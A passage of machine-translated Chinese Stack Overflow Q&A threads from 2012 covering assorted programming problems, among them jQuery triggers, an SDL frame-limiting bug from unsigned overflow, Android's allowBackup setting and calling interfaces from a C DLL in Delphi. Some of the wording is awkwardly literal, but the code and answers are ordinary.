*   在开始和结束时切断不重叠的数据集（使用两个不同的系统，您永远不会同时开始或停止测量，因此有一些多余的数据）
*   实际执行乘法
*   将结果作为新的类对象返回

旁边还有其他函数，你可以猜出它们的作用：plot、lpf、mean、getTimeAtIndex、getIndexAtTime、...

这让我可以简单地做

```
signalsLabview = importLabViewSignals(LabViewData);
signalsMatlab = importMatlabSignals(MatlabData, 100); %hz

hydrPower = signalsLabview.flow * signalsMatlab.pressure;
plot(hydrPower); 
```

或类似的事情。如果你有很多这样的信号你必须做一些数学运算，这真的很有帮助，并且会产生清晰的代码。否则，您有很多通用代码仅用于在每个操作周围进行同步、移位、修剪。也为了快速检查事情很容易。

如果你必须经常做这些事情，我认为绝对值得花一些时间来构建一个合适的框架。

不幸的是，我认为我不能公开这段代码（IP 等），但这不是火箭科学。

# jquery - 隐藏按钮的jQuery触发器

> ID：12648350
> 
> 赞同：-2
> 
> 时间：2012-09-28T22:51:38.963
> 
> 标签：jquery, javascript-events

我有 iframe，在那个框架内我有一个提交按钮，我的 iframe 在一个 div 内。有时 div 可能会被隐藏。在 display:none 时，提交按钮的触发器不起作用。

.trigger('点击');

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:56:57.483

您可以使用类似的方式手动提交表单

```
$('#yourForm').submit(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:15:09.523

无论包含 iframe 的 div 是否隐藏，这都有效。

```
$('iframe').contents().find('input[type=submit]').trigger('click'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T22:54:45.610

尝试使用

```
$(document).delegate("Id or class here", "click", function () {

}); 
```

定义您的事件，然后触发单击按钮的类或 id。id 或 class 需要 # 或 。分别在他们面前。

```
$('#mybutton').trigger('click'); 
```

应该触发您的点击

# c# - 有一个具有很多属性的类/对象，如何在实体框架的 edmx 中自动生成一个表？

> ID：12648353
> 
> 赞同：1
> 
> 时间：2012-09-28T22:52:16.840
> 
> 标签：c#, entity-framework, class

当然这是存在的（或者也许你不能这样做？）。

我的项目中有一个带有一堆属性的类。我已经有一个 edmx，里面有两张桌子。我如何自动为这个新班级制作第三张桌子。我不想手动将 40 个属性添加到新表中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:56:43.753

我意识到这不是一个很好的答案，但我知道 EF 的较新版本（我认为是 4+）支持“代码优先”实体。我从未使用过此功能，但在 Google 上快速搜索“Code First Entity Framework”可能会给您想要的答案。

编辑：这是 Scott Gu 关于该功能的博客的链接（这是我最初阅读的地方）：[http ://weblogs.asp.net/scottgu/archive/2010/07/16/code-first-development-with -entity-framework-4.aspx](http://weblogs.asp.net/scottgu/archive/2010/07/16/code-first-development-with-entity-framework-4.aspx)

# json - 我无法在 Windows 7 64 上安装 oj ruby gem

> ID：12648354
> 
> 赞同：0
> 
> 时间：2012-09-28T22:52:25.703
> 
> 标签：json, ruby-on-rails-3.1, gem, ruby-1.9.2

我试图安装 oj ruby​​ gem

```
gem install oj -v '1.3.5' 
```

这是输出日志 C:/Ruby192/bin/ruby.exe extconf.rb

> > > > > 为 ruby​​ 版本 1.9.2 创建 Makefile <<<<< 创建 Makefile

```
 make
    C:/Ruby192/bin/ruby -e "puts 'EXPORTS', 'Init_oj'"  > oj-i386-mingw32.def
    gcc -I. -IC:/Ruby192/include/ruby-1.9.1/i386-mingw32 -I/C/Ruby192/include/ruby-1.9.1/ruby/backward -I/C/Ruby192/include/ruby-1.9.1 -I.   -DRUBY_TYPE=ruby -DRUBY_RUBY -DRUBY_VERSION=1.9.2 -DRUBY_VERSION_MAJOR=1 -DRUBY_VERSION_MINOR=9 -DRUBY_VERSION_MICRO=2 -DHAS_RB_TIME_TIMESPEC=0 -DHAS_ENCODING_SUPPORT=1 -DHAS_NANO_TIME=1 -DHAS_RSTRUCT=1 -DHAS_IVAR_HELPERS=1 -DHAS_EXCEPTION_MAGIC=0 -DHAS_PROC_WITH_BLOCK=1 -DHAS_TOP_LEVEL_ST_H=0 -DSAFE_CACHE -Wall -O3 -g -Wextra -Wno-unused-parameter -Wno-parentheses -Wpointer-arith -Wwrite-strings -Wno-missing-field-initializers -Wno-long-long  -o cache.o -c cache.c
    cache.c: In function 'oj_cache_new':
    cache.c:54:5: warning: implicit declaration of function 'bzero'
    cache.c:54:5: warning: incompatible implicit declaration of built-in function 'bzero'
    gcc -I. -IC:/Ruby192/include/ruby-1.9.1/i386-mingw32 -I/C/Ruby192/include/ruby-1.9.1/ruby/backward -I/C/Ruby192/include/ruby-1.9.1 -I.   -DRUBY_TYPE=ruby -DRUBY_RUBY -DRUBY_VERSION=1.9.2 -DRUBY_VERSION_MAJOR=1 -DRUBY_VERSION_MINOR=9 -DRUBY_VERSION_MICRO=2 -DHAS_RB_TIME_TIMESPEC=0 -DHAS_ENCODING_SUPPORT=1 -DHAS_NANO_TIME=1 -DHAS_RSTRUCT=1 -DHAS_IVAR_HELPERS=1 -DHAS_EXCEPTION_MAGIC=0 -DHAS_PROC_WITH_BLOCK=1 -DHAS_TOP_LEVEL_ST_H=0 -DSAFE_CACHE -Wall -O3 -g -Wextra -Wno-unused-parameter -Wno-parentheses -Wpointer-arith -Wwrite-strings -Wno-missing-field-initializers -Wno-long-long  -o cache8.o -c cache8.c
    gcc -I. -IC:/Ruby192/include/ruby-1.9.1/i386-mingw32 -I/C/Ruby192/include/ruby-1.9.1/ruby/backward -I/C/Ruby192/include/ruby-1.9.1 -I.   -DRUBY_TYPE=ruby -DRUBY_RUBY -DRUBY_VERSION=1.9.2 -DRUBY_VERSION_MAJOR=1 -DRUBY_VERSION_MINOR=9 -DRUBY_VERSION_MICRO=2 -DHAS_RB_TIME_TIMESPEC=0 -DHAS_ENCODING_SUPPORT=1 -DHAS_NANO_TIME=1 -DHAS_RSTRUCT=1 -DHAS_IVAR_HELPERS=1 -DHAS_EXCEPTION_MAGIC=0 -DHAS_PROC_WITH_BLOCK=1 -DHAS_TOP_LEVEL_ST_H=0 -DSAFE_CACHE -Wall -O3 -g -Wextra -Wno-unused-parameter -Wno-parentheses -Wpointer-arith -Wwrite-strings -Wno-missing-field-initializers -Wno-long-long  -o dump.o -c dump.c
    In file included from c:/Ruby192/include/ruby-1.9.1/ruby/defines.h:205:0,
                     from c:/Ruby192/include/ruby-1.9.1/ruby/ruby.h:74,
                     from c:/Ruby192/include/ruby-1.9.1/ruby.h:32,
                     from oj.h:43,
                     from dump.c:39:
    c:/Ruby192/include/ruby-1.9.1/ruby/win32.h:272:12: error: conflicting types for 'gettimeofday'
    c:\devkit\mingw\bin\../lib/gcc/mingw32/4.5.2/../../../../include/sys/time.h:39:29: note: previous declaration of 'gettimeofday' was here
    In file included from c:/Ruby192/include/ruby-1.9.1/ruby/ruby.h:1326:0,
                     from c:/Ruby192/include/ruby-1.9.1/ruby.h:32,
                     from oj.h:43,
                     from dump.c:39:
    c:/Ruby192/include/ruby-1.9.1/ruby/missing.h:42:8: error: redefinition of 'struct timezone'
    c:\devkit\mingw\bin\../lib/gcc/mingw32/4.5.2/../../../../include/sys/time.h:26:8: note: originally defined here
    In file included from dump.c:39:0:
    oj.h:50:21: fatal error: pthread.h: No such file or directory
    compilation terminated.
    make: *** [dump.o] Error 1 
```

我正在运行 Windows 7 x64、ruby 1.92、rails 3.1。

知道如何安装 oj gem 吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T01:02:11.063

OJ 的新版本修复了 Windows 问题。我安装了 OJ 1.4.3

# java - XPath (SimpleXML) 根据孩子的兄弟姐妹的值选择孩子

> ID：12648363
> 
> 赞同：2
> 
> 时间：2012-09-28T22:53:11.503
> 
> 标签：java, xml, xpath, simple-framework

我正在使用 SimpleXML (Java)，并且试图根据列表的兄弟姐妹之一的值获取对象列表。

所以，这是我的 XML：

```
<xml>
  <metadata>
    <resources>

      <resource>
        <ittype>Service_Links</ittype>
        <links>
          <link>
            <path>http://www.stackoverflow.com</path>
            <description>Stack Overflow</description>
          </link>
          <link>
            <path>http://www.google.com</path>
            <description>Google</description>
          </link>
        </links>
      </resource>

      <resource>
        <ittype>Article_Links</ittype>
        <links>
          ...
        </links>
      </resource>

      ...

    </resources>
  </metadata>
</xml> 
```

我想要做的是使用 XPath 创建一个 SimpleXML 注释，以便获取列表的兄弟**"ittype"**等于**"Service_Links"的所有****“链接”**的列表。

 ****因此，例如，这有效，但前提是我试图静态获取第一个**“资源”** -node（而不是根据它的兄弟**“ittype”**动态获取**“资源”** -node ：

 **```
@ElementList(name="links")
@Path("metadata/resources[1]/resource")
public List<Link> link; 
```

我已经尝试了很多方法来格式化 xpath 以动态找到我想要的**“资源”** -节点，我不可能在这里全部列出它们；但是，这是我尝试过的一个示例，在我看来它应该可以工作；不知道我做错了什么......

```
@ElementList(name="links")
@Path("metadata/resources[resource/ittype='Service_Links']/resource")
public List<Link> link; 
```

我用谷歌搜索了很多，包括在 SO 上，但找不到非常相似的地方；而我确实找到的东西，翻译得不够好，无法让我发现我需要做的事情。例如，即使它非常相似，[这个 SO](https://stackoverflow.com/questions/912194/matching-a-node-based-on-a-siblings-value-with-xpath)似乎也不起作用。

* * *

**更新#1（8OCT @ 12:38pm）**

根据反馈，我试过这个：

```
@ElementList
@Path("metadata/resources/resource[ittype='Service_Links']")
public List<Link> link; 
```

没有骰子：org.simpleframework.xml.core.PathException：“链接”字段中路径“元数据/资源/资源[ittype='Service_Links']”的索引无效

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T16:23:55.737

我从来没有用 SimpleXml 来实现这种风格的 XPath；从更彻底地阅读他们的文档来看，他们似乎还没有实现这个 XPath 功能。

所以我在这里选择了一种不同的 XML 解析策略：[https ://stackoverflow.com/a/13236117/483257](https://stackoverflow.com/a/13236117/483257)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:21:29.523

我不具体了解 SimpleXML，但是这个 xpath 应该可以为您提供所需的元素：

```
metadata/resources/resource[ittype = 'Service_Links'] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:24:20.280

1.  您的 xml 示例格式不正确。该`link`元素没有其关闭对应物。这同样适用于`description`el。我认为这些只是错别字。
2.  这是有效的 XPath 表达式：

`/metadata/resources/resource/links/link[parent::links/preceding-sibling::ittype/text()=='Service_Links']`

或更简单的版本：

`/metadata/resources/resource[ittype = 'Service_Links']/links/link`******

# c - 尝试实现游戏循环以限制最大 fps 时的无限循环

> ID：12648368
> 
> 赞同：0
> 
> 时间：2012-09-28T22:53:26.983
> 
> 标签：c

我正在尝试实现一个限制我的游戏执行速度的游戏循环，以便它以最大 fps 速度运行。由于某种原因，我的代码冻结并且没有通过第一次迭代。

代码很短，大致如下：

```
int main(int argc, char *argv[])
{
short int end = 0;
struct Escenario level;
struct Personaje player;
SDL_Surface* screen = NULL;
Uint32 next_frame_tick = 0;
Uint32 sleep_time = 0;

readLevelFile( &level, &player );
screen = initSDL();
showBackground(level, screen    );

while(!end){

    erasePlayer(&player, screen);

    end = manageKeyboardKeys( &player );
    detectCollisionsAndMove( level, &player );

    showPlayer(player, screen );

    next_frame_tick += SKIP_TICKS;
    sleep_time = next_frame_tick - SDL_GetTicks();

    if( sleep_time > 0 ) SDL_Delay( sleep_time );

}

freeMemory(nivel);
SDL_Quit(); 

return 0; 
```

}

如果我删除了引用 sleep_time > 0 的 if 条件，它不会卡住，但它不会做我想要的。我尝试用以下内容替换该行：

```
while( ( next_frame_tick - SDL_GetTicks() ) > 0 ) 
{
} 
```

它也不起作用，所以我的想法用完了......任何人都可以帮助我一点吗？

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:01:03.453

您在这里遇到了无符号溢出：

```
sleep_time = next_frame_tick - SDL_GetTicks(); 
```

如果`next_frame_tick`< ，这条线会发生什么`SDL_GetTicks()`？

你只是得到两个无符号值的差异，这不是负数，而是正数，因为所有涉及的类型都是无符号的。

在这种情况下，差值将是 2 ^(32) + `next_frame_tick`-`SDL_GetTicks()`而不是`next_frame_tick`- `SDL_GetTicks()`。

你应该做的是：

```
ticks = SDL_GetTicks(); // ticks time is another Uint32
sleep_time = (next_frame_tick >= ticks) ? next_frame_tick - ticks : 0; 
```

# android - 什么是“android:allowBackup”？

> ID：12648373
> 
> 赞同：287
> 
> 时间：2012-09-28T22:55:02.427
> 
> 标签：android, adt, compiler-warnings, android-lint, android-backup-service

自从[**新的 ADT 预览版（版本 21）**](http://tools.android.com/download/adt-21-preview)以来，他们有一个新的 lint 警告，告诉我清单文件（在应用程序标记中）的下一件事：

> 应该明确地将 android:allowBackup 设置为 true 或 false（默认情况下为 true，这可能会对应用程序的数据产生一些安全隐患）

在[**官方网站上**](http://tools.android.com/download/adt-21-preview)，他们写道：

> 一些新的检查：您必须明确决定您的应用是否允许备份，以及标签检查。有一个用于设置库路径的新命令行标志。编辑时对增量 lint 分析的许多改进。

这是什么警告？什么是备份功能，如何使用它？

另外，为什么警告告诉我它有安全隐患？禁用此功能有哪些缺点和优点？

* * *

清单的备份有两个概念：

*   "android: **allowBackup** " 允许通过 adb 进行备份和恢复，如下[**所示**](http://developer.android.com/reference/android/R.attr.html#allowBackup)：

> 是否允许应用程序参与备份和恢复基础架构。如果此属性设置为 false，则不会执行应用程序的备份或恢复，即使是全系统备份也会导致所有应用程序数据通过 adb 保存。此属性的默认值为 true。

[这被认为是一个安全问题，因为人们可以通过ADB](https://en.wikipedia.org/wiki/Android_Debug_Bridge#Android_Debug_Bridge)备份您的应用程序，然后将您的应用程序的私人数据获取到他们的 PC 中。

但是，我认为这不是问题，因为大多数用户不知道 adb 是什么，如果他们知道，他们也会知道如何 root 设备。ADB 功能只有在设备启用了调试功能的情况下才能工作，这需要用户启用它。

因此，只有将设备连接到 PC 并启用调试功能的用户才会受到影响。如果他们的 PC 上有使用 ADB 工具的恶意应用程序，这可能会出现问题，因为该应用程序可以读取私有存储数据。

我认为谷歌应该在开发者类别中添加一个默认禁用的功能，以允许通过 ADB 备份和恢复应用程序。

*   “android: **backupAgent** ”允许使用云的备份和恢复功能[**，**](http://developer.android.com/guide/topics/data/backup.html#Basics)如下[**所示**](http://developer.android.com/guide/topics/manifest/application-element.html#agent)：[](http://developer.android.com/guide/topics/data/backup.html#Basics)

 **> 实现应用程序的备份代理的类的名称，BackupAgent 的子类。属性值应该是完全限定的类名（例如，“com.example.project.MyBackupAgent”）。但是，作为简写，如果名称的第一个字符是句点（例如，“.MyBackupAgent”），则会将其附加到元素中指定的包名称中。没有默认值。必须指定名称。

这不是安全问题。

* * *

## 回答 #1

> 赞同：151
> 
> 时间：2012-12-10T18:28:06.567

对于此 lint 警告，与所有其他 lint 警告一样，请注意，您可以获得比单行错误消息中的内容更完整的解释；您不必在网上搜索更多信息。

如果您通过 Eclipse 使用 lint，请打开 lint 警告视图，您可以在其中选择 lint 错误并查看更长的说明，或者在错误行调用快速修复 (Ctrl-1)，其中一个建议是“解释这个问题”，也会弹出更全面的解释。如果您不使用 Eclipse，您可以从 lint ( `lint --html <filename>`) 生成 HTML 报告，其中包括警告旁边的完整解释，或者您可以要求 lint 解释特定问题。例如，与 相关的问题`allowBackup`有 id `AllowBackup`（显示在错误消息的末尾），所以更完整的解释是：

```
$ ./lint --show AllowBackup
AllowBackup
-----------
Summary: Ensure that allowBackup is explicitly set in the application's
manifest

Priority: 3 / 10
Severity: Warning
Category: Security 
```

该`allowBackup`属性确定是否可以备份和恢复应用程序的数据，如此[处所述](http://developer.android.com/reference/android/R.attr.html#allowBackup)。

> 默认情况下，此标志设置为`true`。当此标志设置为 时，用户可以使用和`true`备份和恢复应用程序数据。`adb backup``adb restore`
> 
> 这可能会对应用程序产生安全后果。`adb backup`允许启用 USB 调试的用户从设备复制应用程序数据。备份后，用户可以读取所有应用程序数据。`adb restore`允许从用户指定的源创建应用程序数据。还原后，应用程序不应假定数据、文件权限和目录权限是由应用程序本身创建的。
> 
> 设置`allowBackup="false"`选择应用程序退出备份和恢复。
> 
> 要修复此警告，请确定您的应用程序是否应支持备份并显式设置`android:allowBackup=(true|false)`

点击这里了解[更多信息](http://developer.android.com/reference/android/R.attr.html#allowBackup)

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2013-04-01T13:49:50.870

以下是这种意义上的备份的真正含义：

> Android 的备份服务允许您将持久应用程序数据复制到远程“云”存储，以便为应用程序数据和设置提供还原点。如果用户执行恢复出厂设置或转换为新的 Android 设备，系统会在重新安装应用程序时自动恢复您的备份数据。这样，您的用户就不需要重现他们以前的数据或应用程序设置。

~取自[http://developer.android.com/guide/topics/data/backup.html](http://developer.android.com/guide/topics/data/backup.html)

您可以在此处以开发者身份注册此备份服务： [https ://developer.android.com/google/backup/signup.html](https://developer.android.com/google/backup/signup.html)

可以备份的数据类型有文件、数据库、sharedPreferences、缓存和库。这些通常存储在您设备的 /data/data/[com.myapp] 目录中，该目录受读保护，除非您具有 root 权限，否则无法访问。

**更新**：您可以在 BackupManager 的 api 文档中看到此标志：[BackupManager](http://developer.android.com/reference/android/app/backup/BackupManager.html#attr_android:allowBackup)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-11-17T00:02:36.000

这没有明确提及，但基于以下文档，我认为这意味着应用程序需要声明和实现 BackupAgent 才能使数据备份工作，即使在 allowBackup 设置为 true 的情况下（这是默认值）。

[http://developer.android.com/reference/android/R.attr.html#allowBackup](http://developer.android.com/reference/android/R.attr.html#allowBackup) [http://developer.android.com/reference/android/app/backup/BackupManager.html](http://developer.android.com/reference/android/app/backup/BackupManager.html) [http://developer.android。 com/guide/topics/data/backup.html](http://developer.android.com/guide/topics/data/backup.html)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-04-18T14:55:41.683

这是**隐私**问题。如果应用程序包含敏感数据，建议禁止用户备份应用程序。可以访问备份文件（即何时`android:allowBackup="true"`），即使在非 root 设备上也可以修改/读取应用程序的内容。

解决方案 -`android:allowBackup="false"`在清单文件中使用。

您可以阅读这篇文章以获取更多信息： [使用备份技术破解 Android 应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-15-hacking-android-apps-using-backup-techniques/)**

# ios - 在（ios sdk）中按下一个键时监听

> ID：12648374
> 
> 赞同：0
> 
> 时间：2012-09-28T22:55:09.650
> 
> 标签：ios, cocoa-touch

有没有办法以编程方式捕获软键盘中的任何键被按下？当按下任何键时，我需要发送一个事件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:05:53.673

您将希望成为您用来展示键盘的任何响应者的代表。在大多数情况下，它只是一个 UITextField 或 UITextView。在任何一种情况下，将自己指定为代表并回复

[文本字段：shouldChangeCharactersInRange：replacementString：](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextFieldDelegate_Protocol/UITextFieldDelegate/UITextFieldDelegate.html#//apple_ref/occ/intfm/UITextFieldDelegate/textField%3ashouldChangeCharactersInRange%3areplacementString%3a)

# javascript - jquery isotope plugin 容器高度不会随 isotope-item 增长（与砌体相同）

> ID：12648376
> 
> 赞同：6
> 
> 时间：2012-09-28T22:55:58.163
> 
> 标签：javascript, jquery, html, jquery-masonry, jquery-isotope

我有一个同位素项目，当有人在其中发表评论时，它的高度会增加。当它生长时，我如何告诉主要同位素容器与它一起生长？现在发生的事情是，随着同位素项目的增长，同位素容器保持其在调用 $(".home_main").isotope(); 时设置的初始高度。所以当我在同位素项目中留下评论时，项目会增长，然后被主容器切断。谢谢。

我看到你可以设置`resizesContainer: true`，但这对我没有帮助。谢谢。

不知道它是否有任何区别，但我也用 Masonry jquery 插件尝试过这个（看起来很相似）并且遇到了同样的问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-28T23:16:04.743

在这里找到了答案：

[https://github.com/desandro/isotope/issues/275](https://github.com/desandro/isotope/issues/275)

您必须像这样调用重新布局：

```
$("#your_container").isotope( 'reLayout' ) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-08-23T10:36:01.023

在同位素 V2 中，语法是

```
$("#your_container").isotope('layout') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-04-07T21:04:12.873

在 Isotope PACKAGED v2.2.2 中，您还可以“重新排列/重新布局”您的容器：

```
 $(window).scroll(function(){
        $container.isotope( 'layout' );
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-26T19:18:35.583

如果您使用最新的同位素（未指定版本，但您可以看到此评论的日期）阅读第一个链接并包含适当的几行并包含第二个链接中的库。

[http://isotope.metafizzy.co/appendix.html](http://isotope.metafizzy.co/appendix.html)

[http://imagesloaded.desandro.com/](http://imagesloaded.desandro.com/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-09-11T13:06:38.833

在同位素**V3中**

```
$(window).on('load', function(){
    var $container = $('#your_container');
    $container.isotope({
        itemSelector: '.item'
    });
}); 
```

# javascript - jQuery 更改内容后 CSS 渐变看起来不正确

> ID：12648377
> 
> 赞同：0
> 
> 时间：2012-09-28T22:56:06.787
> 
> 标签：javascript, jquery, html, css

我有一个我正在为自己开发的小型网络应用程序。

当我单击添加按钮时，它会调用一些 .load 函数来返回错误消息和更新的表。

但是，它会导致渐变看起来像这样（查看错误消息和表格的左上/右上方）：

![在此处输入图像描述](../Images/ae94d226eadce89fc576045427c21405.png)

渐变设置为包含 div 的背景（绿色中的灰色）。jQuery`<p>`为消息加载一个`<table>`，为表格加载一个。

我不明白为什么渐变会发生这种情况，因为它在初始页面加载时工作正常（在 jQuery 更新它之前）。

反正有没有强制背景“刷新”？如果您检查元素或更改为不同的选项卡，然后返回此选项卡，它会自行修复。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:15:29.360

由于提供的信息有限，我认为这不是“背景渐变”的问题，而是前景中具有不透明和/或彩色背景的元素被覆盖在背景渐变之上的问题。

您是否将相关样式设置`<p>`为具有透明背景，或者是否应用了背景颜色（直接或固有地）？

请为该问题提供更多信息（CSS 和一些 HTML）以获得更好的答案。

# c++ - Windows 上的 endian.h

> ID：12648379
> 
> 赞同：5
> 
> 时间：2012-09-28T22:56:16.483
> 
> 标签：c++, windows, cross-platform

我正在开发一个我需要的跨平台项目`endian.h`。但这个文件不在 Windows 或 Mac OS X 上。

有什么方法可以让它在没有文件的情况下工作，或者有没有办法获取文件？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T23:14:22.340

> 我正在做一个跨平台项目，我需要 endian.h。

endian.h 不是跨平台的。它非常清楚地标记为：“这些功能是非标准的。”

你*不需要*endian.h。您需要的是该标头提供的一些功能。Windows、Linux 和 Mac（以及 Solaris 和其他）这三个都提供原生大端函数，并且它们使用接近标准的名称`htons`,`ntohl`等。这些会满足您的需要吗？如果是这样，请使用它们。它们是便携式的。如果没有，您将不得不自己动手。这并不难。或者看看Boost。它可能正是你想要的。

# delphi - 在delphi中使用C dll什么都不返回

> ID：12648387
> 
> 赞同：1
> 
> 时间：2012-09-28T22:57:55.877
> 
> 标签：delphi, dll, dllimport

我一直在尝试根据此[文档](http://maxdb.sap.com/documentation/sqldbc/SQLDBC_API/SQLDBC__C_8h.html#a252)在 delphi 中重用 C dll 文件。

服务器运行良好，我可以通过 java 和 php 访问和使用本地服务器上的数据库。

在 delphi 上，我使用了动态加载，并且在所有返回变量的函数上运行良好，但在返回接口的函数上失败了。

```
unit for library :
unit SQLDBC_C;

interface
uses windows, classes, sysutils;

type
  SQLDBC_IRuntime = interface
  end;

var
  getSDKVersion : function :Pchar; stdcall;
  ClientRuntime_GetClientRuntime: function (errorText:Pchar; errorTextSize:Integer) : SQLDBC_IRuntime; stdcall;

implementation

var
  libhandle : THandle;

procedure initLibrary;
begin
  libhandle := LoadLibrary('libSQLDBC_C.dll');
  if libhandle>=23 then begin
     @getSDKVersion:=GetProcAddress(libhandle,'getSDKVersion');
     @ClientRuntime_GetClientRuntime:=
        GetProcAddress(libhandle,'ClientRuntime_GetClientRuntime');
  end;
end;

initialization
begin
  initLibrary;
end;

finalization
begin
  if libhandle>=32 then
    FreeLibrary(libhandle);
end;

end. 
```

这是测试程序：

```
procedure TForm1.Button1Click(Sender: TObject);
var
  err : array [0..200] of char;
  rt : SQLDBC_IRuntime;

begin
  Memo1.Clear;
  FillChar(err, sizeof(err), 0);
  Memo1.Lines.Add(getSDKVersion); //this function successed

  rt := ClientRuntime_GetClientRuntime(@err,200); 
  //this function had no return value, (rt always nil) but no error return at err variable
  if assigned(rt) then begin
    ......
  end;
end; 
```

我读过[geskill](https://stackoverflow.com/questions/2266417/delphi-calling-a-function-from-a-vc-dll-that-exports-a-interface-class)、[Dan Hacker](https://stackoverflow.com/questions/6629852/delphi-interface-from-dll)、[max](https://stackoverflow.com/questions/8846545/is-it-safe-to-use-interfaces-from-dll)和[Ron](https://stackoverflow.com/questions/4798283/calling-dlls-with-pointers-in-delphi)提出的类似问题，但它无法解决我的问题。

谁能告诉我这里有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T04:45:52.487

我无法测试它，因为我没有`libSQLDBC_C.dll`.

问题[已经解释过了](https://stackoverflow.com/questions/9349530/why-can-a-widestring-not-be-used-as-a-function-return-value-for-interop)。作为您的案例的解决方法，您可以在 Delphi`ClientRuntime_GetClientRuntime`声明中返回一个指针

```
ClientRuntime_GetClientRuntime: function (errorText:Pchar;
                                errorTextSize:Integer): Pointer; stdcall; 
```

并将其转换为`SQLDBC_IRuntime`接口：

```
var
  err : array [0..200] of char;
  rt : SQLDBC_IRuntime;

begin
  Pointer(rt):= ClientRuntime_GetClientRuntime(@err,200); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-29T08:08:41.870

返回接口的 C++ 函数不容易映射到 Delphi 函数。Delphi 中托管类型的返回值的调用约定与 C++ 使用的不匹配。

为了说明，我创建了一个导出此函数的简单 C++ 测试 DLL：

```
extern "C" __declspec(dllexport) IUnknown* __stdcall GetInterface()
{
    CoInitialize(NULL);
    IUnknown* result;
    CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, 
      IID_IUnknown, (void**) &result);
    return result;
} 
```

将其映射到 Delphi 的明显方法是这样的：

```
function GetInterface: IUnknown; stdcall; external DLL name '_GetInterface@0'; 
```

但是，当我们调用此函数时，它总是返回`nil`.

解决方法完全按照 Serg 的建议：

```
function GetInterface: Pointer; stdcall; external DLL name '_GetInterface@0'; 
```

然后我们可以这样称呼它：

```
var
  intf: IUnknown;
....
Pointer(intf) := GetInterface; 
```

当我们这样做时，`intf`不是`nil`，我们可以很高兴地调用它的方法。

所以，我们在这里了解到的是，Delphi 不能轻易调用返回接口的外部函数，除非这些外部函数也在 Delphi 中实现。但至少我们有一个可行的解决方法。

* * *

不幸的是，这种解决方法对您没有立即用处。那是因为 `SQLDBC_IRuntime`它是一个 C++ 类。它不是 COM 兼容接口。注意`SQLDBC_IRuntime`不实现`IInterface`。所以它不提供`_AddRef`,`_Release`和`QueryInterface`。Delphi 的接口支持基于`IInterface`. 这意味着您不能`SQLDBC_IRuntime`从 Delphi 使用。

您将需要创建一个 C++ 桥 DLL，以 Delphi 可以调用的方式公开功能。例如，通过公开调用`SQLDBC_IRuntime`.

# emacs - Emacs Yaml 编辑

> ID：12648388
> 
> 赞同：8
> 
> 时间：2012-09-28T22:58:07.057
> 
> 标签：emacs, yaml

是否有任何 Emacs lisp 插件可以让我轻松地在 yaml 文件中编辑或输入数据。

例如：

```
--- 示例 yaml 文件 ---
姓名 ：
地址：
城市 ：
状态：
压缩 ：

电话：
电子邮件
- - 结尾  -  - 

```

在 Emacs 中打开文件时，光标会自动放在第一个 Yaml 键处。在这种情况下“名称：”，当我在“名称：”之后输入完一个名称并按回车键时，它会自动移动到下一个键。在这种情况下“地址：”

前进/后退选项卡可用于在键之间来回移动。

有什么可做的吗？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-29T12:03:25.377

[http://emacswiki.org/emacs/YamlMode](http://emacswiki.org/emacs/YamlMode)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T19:34:51.533

我从网上收集了一些零碎的东西，得到了这个：

```
(defun yaml-next-field ()
  "Jump to next yaml field"
  (interactive)
  (search-forward-regexp ": *"))
(defun yaml-prev-field ()
  "Jump to next yaml field"
  (interactive)
  (search-backward-regexp ": *"))
(add-hook 'yaml-mode-hook
          '(lambda ()
             (define-key yaml-mode-map "\C-m" 'newline-and-indent)
             (define-key yaml-mode-map "\M-\r" 'insert-ts)
             (define-key yaml-mode-map (kbd "C-<tab>") 'yaml-next-field)
             (define-key yaml-mode-map (kbd "C-S-<tab>") 'yaml-prev-field)
             )) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T23:24:39.177

您可以定义一个自定义宏来执行您想要的操作。

它可能是这样的：

```
;; define named macro
(fset 'jump-next-colon
  [?\C-f ?\C-s ?: ?\C-  ? ])
;; assign shortcut ctrl+alt+j
(global-set-key (kbd "C-M-j") 'jump-next-colon) 
```

如果这不是您正在寻找的内容，您可以编写自己的宏。请参阅[http://emacswiki.org/emacs/KeyboardMacros](http://emacswiki.org/emacs/KeyboardMacros)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-29T04:34:33.620

[jump-char](https://github.com/lewang/jump-char)可以提供帮助。它可以让您快速跳转到下一个/上一个字符的出现。

# java - 将元素插入双精度数组

> ID：12648389
> 
> 赞同：0
> 
> 时间：2012-09-28T22:58:16.417
> 
> 标签：java, arrays, insert, double, element

我有一种方法，看起来不错，可以将双精度值放入双精度数组。这是

```
insert(int i, double value) 
```

其中 i 是索引 (array[i]) 和 value 是我想要的索引。

